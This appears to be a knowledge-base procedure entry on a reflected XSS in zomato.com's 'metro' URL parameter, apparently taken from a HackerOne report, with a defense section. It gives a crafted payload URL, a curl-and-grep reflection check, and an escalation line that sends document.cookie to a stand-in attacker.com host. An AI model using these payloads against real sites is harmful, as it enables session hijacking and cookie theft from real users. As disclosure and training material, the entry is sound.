---
tags:
  - xss
  - reflected-xss
  - javascript-injection
  - url-parameter
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:41.430Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
id: c2c4a5ec-0990-4ccf-aea2-a5e66d4859db
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-JavaScript-into-Metro-Parameter-for-XSS

## Summary

This procedure exploits a reflected Cross-Site Scripting (XSS) vulnerability on zomato.com by injecting a malicious JavaScript payload into the 'metro' URL parameter, causing the code to execute immediately upon page load in the victim's browser. It demonstrates how unsanitized user input in URL parameters can lead to arbitrary JavaScript execution, enabling attacks like session hijacking or cookie theft.

## Description

The attack targets the 'metro' parameter in URLs on zomato.com, such as those used for location-based filtering (e.g., https://www.zomato.com/doha/drinks-and-nightlife-in-al-ghanim). By appending a payload like '-prompt('XSS')-' to the parameter, the application reflects the input without proper encoding, allowing JavaScript to run. This was discovered in a HackerOne report and works even in Chrome due to the direct execution on page load. Potential outcomes include stealing session cookies, phishing, or defacing the page, though the report focuses on proof-of-concept execution.

## Requirements

1. Access to a web browser (e.g., Chrome) for testing execution
2. Internet connectivity to reach zomato.com
3. No authentication required, as it's a public-facing endpoint

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization for URL parameters, escaping special characters like quotes and dashes
- Use Content Security Policy (CSP) headers to restrict inline JavaScript execution
- Employ Web Application Firewalls (WAFs) to detect and block common XSS payloads in query strings
- Regularly scan for reflected XSS using tools like OWASP ZAP or Burp Suite

## Objectives

1. Execute arbitrary JavaScript in the context of the victim's browser session
2. Demonstrate vulnerability for reporting or remediation
3. Highlight risks of client-side data theft or manipulation

## Instructions

### Step 1: Craft the Malicious URL

**Context**: Prepare the URL with the injected payload to test for reflection without sanitization.

Construct the URL: https://www.zomato.com/doha/drinks-and-nightlife-in-al-ghanim?metro='-prompt('XSS')-'

This payload uses single quotes to break out of the expected string context, allowing the prompt() function to execute.

### Step 2: Load the URL in a Browser

**Context**: Trigger the page load to reflect and execute the injected JavaScript.

Open the crafted URL in a web browser such as Chrome. Upon loading, the JavaScript should execute, displaying a prompt dialog with 'XSS'.

For automated testing, use curl to fetch the response and inspect for the reflected payload:

```bash
curl "https://www.zomato.com/doha/drinks-and-nightlife-in-al-ghanim?metro='-prompt('XSS')-'" | grep "prompt"
```

> The curl command retrieves the page content; grep checks if the payload is reflected unescaped, indicating vulnerability. Expected output includes the unencoded JavaScript in the HTML response.

### Step 3: Verify Execution

**Context**: Confirm the XSS by observing browser behavior.

In the browser, if a prompt appears, the attack succeeds. To escalate, replace prompt('XSS') with more malicious code, e.g., to steal cookies: document.location='http://attacker.com/steal?cookie='+document.cookie

**Expected Output**: Prompt dialog or network request to attacker's server if escalated.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[web]]
- [[JavaScript]]
